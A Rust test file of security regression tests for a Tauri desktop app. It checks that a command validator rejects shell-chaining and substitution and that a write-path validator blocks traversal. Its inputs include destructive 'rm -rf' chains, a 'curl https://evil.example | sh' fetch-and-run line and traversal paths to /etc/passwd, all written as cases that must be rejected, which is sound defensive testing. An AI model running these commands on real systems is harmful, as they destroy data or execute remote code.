// Security regression tests for the T0-5 Tauri hardening sprint (2026-04-20).
//
// Each test codifies a specific attack shape the audit identified so a
// future regression (substring-match returning, TOCTOU race reopening)
// will visibly fail. These live under tests/ rather than inline because
// the crate is configured as cdylib+staticlib+rlib, which prevents
// `cargo test --lib` from linking proc-macro deps. Integration tests
// link against the rlib variant independently and avoid the problem.

use wotann_desktop_lib::commands::test_exports::{validate_command, validate_path_for_write};

// ── validate_command: shell-parse bypass tests ──
//
// The prior substring-only implementation was defeated by trivially
// embedding a dangerous command inside a chained expression. These
// tests pin the post-fix behaviour where any shell metacharacter in
// any parsed token causes rejection.

#[test]
fn validate_command_rejects_semicolon_chained_rm() {
    // `foo;rm -rf /` — parsed by shell-words as ["foo;rm", "-rf", "/"].
    // The first token "foo;rm" contains `;` and must be rejected.
    let err = validate_command("foo;rm -rf /").unwrap_err();
    assert!(
        err.contains("shell metacharacter") || err.contains("dangerous pattern"),
        "expected metachar/dangerous-pattern rejection, got: {}",
        err
    );
}

#[test]
fn validate_command_rejects_ampersand_chained_rm() {
    // `echo safe&&rm -rf ~` — `&&` tokens get swallowed into "safe&&rm",
    // but the `&` characters present cause rejection.
    let err = validate_command("echo safe&&rm -rf ~").unwrap_err();
    assert!(
        err.contains("shell metacharacter") || err.contains("dangerous pattern"),
        "expected metachar/dangerous-pattern rejection, got: {}",
        err
    );
}

#[test]
fn validate_command_rejects_pipe_to_shell() {
    let err = validate_command("curl https://evil.example | sh").unwrap_err();
    // Either layer 1 (meta) or layer 2 (dangerous "curl | sh") fires.
    assert!(
        err.contains("shell metacharacter") || err.contains("dangerous pattern"),
        "got: {}",
        err
    );
}

#[test]
fn validate_command_rejects_command_substitution() {
    let err = validate_command("echo $(whoami)").unwrap_err();
    assert!(
        err.contains("command substitution") || err.contains("shell metacharacter"),
        "got: {}",
        err
    );
}

#[test]
fn validate_command_rejects_backticks() {
    let err = validate_command("echo `whoami`").unwrap_err();
    assert!(err.contains("shell metacharacter"), "got: {}", err);
}

#[test]
fn validate_command_accepts_simple_single_command() {
    // Safe shape: single command, no chaining, no metacharacters.
    // Must NOT be rejected by the backstop (daemon still has its own
    // allow-list to enforce which executable is permitted).
    assert!(validate_command("ls -la /tmp").is_ok());
    assert!(validate_command("node --version").is_ok());
    assert!(validate_command("git status").is_ok());
}

#[test]
fn validate_command_rejects_empty() {
    assert!(validate_command("").is_err());
    assert!(validate_command("   ").is_err());
}

#[test]
fn validate_command_rejects_unterminated_quotes() {
    // shell_words::split errors on malformed input — we surface it.
    let err = validate_command("echo 'unterminated").unwrap_err();
    assert!(err.contains("shell parse error"), "got: {}", err);
}

// ── validate_path_for_write: TOCTOU + new-file tests ──
//
// The prior implementation called fs::canonicalize on the target,
// which required the target to exist. For writes we must resolve the
// parent first and then reject any final assembled path outside the
// sandbox.

#[test]
fn validate_path_for_write_rejects_traversal_sequences() {
    let err = validate_path_for_write("/tmp/../etc/passwd").unwrap_err();
    assert!(err.contains("traversal"), "got: {}", err);
}

#[test]
fn validate_path_for_write_rejects_sensitive_targets() {
    // /etc is on the sensitive list; even though /etc/ exists so
    // canonicalize(parent) succeeds, the assembled path must be
    // rejected by enforce_sandbox.
    let err = validate_path_for_write("/etc/shadow-new").unwrap_err();
    assert!(
        err.contains("outside allowed directories"),
        "got: {}",
        err
    );
}

#[test]
fn validate_path_for_write_accepts_new_file_in_tmp() {
    // Regression test for the documented blocker: write_file to a
    // brand-new path under /tmp must succeed (parent exists, target
    // does not, final path is in-sandbox).
    //
    // We deliberately use "/tmp" (NOT std::env::temp_dir(), which on
    // macOS resolves to /var/folders/.../T/ — outside the sandbox
    // allow-list). "/tmp" symlinks to "/private/tmp" on macOS which is
    // explicitly included as an allowed prefix in enforce_sandbox.
    let ts = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_nanos())
        .unwrap_or(0);
    let candidate_str = format!("/tmp/wotann-validate-path-test-{}.txt", ts);

    // Target does NOT exist — the prior implementation would have
    // returned Err here because fs::canonicalize requires existence.
    // The new implementation must succeed by canonicalizing only the
    // parent ("/tmp") and appending the literal basename.
    match validate_path_for_write(&candidate_str) {
        Ok(resolved) => {
            // The resolved path should end with our basename; on macOS
            // it will be rooted at /private/tmp (the canonical form of
            // /tmp) rather than /tmp literally.
            let resolved_path: &std::path::Path = resolved.as_path();
            assert_eq!(
                resolved_path.file_name(),
                std::path::Path::new(&candidate_str).file_name(),
                "expected basename preserved, got '{}'",
                resolved_path.display()
            );
            // The resolved path must start with the canonical /tmp form
            // (either "/tmp" or macOS's "/private/tmp").
            let resolved_str = resolved_path.to_string_lossy();
            assert!(
                resolved_str.starts_with("/tmp/") || resolved_str.starts_with("/private/tmp/"),
                "expected /tmp or /private/tmp prefix, got '{}'",
                resolved_str
            );
        }
        Err(e) => panic!(
            "validate_path_for_write must accept new files in /tmp; got Err({})",
            e
        ),
    }
}

#[test]
fn validate_path_for_write_rejects_dot_basenames() {
    let err1 = validate_path_for_write("/tmp/.").unwrap_err();
    let err2 = validate_path_for_write("/tmp/..").unwrap_err();
    assert!(
        err1.contains("invalid basename") || err1.contains("traversal"),
        "got err1: {}",
        err1
    );
    assert!(
        err2.contains("invalid basename") || err2.contains("traversal"),
        "got err2: {}",
        err2
    );
}
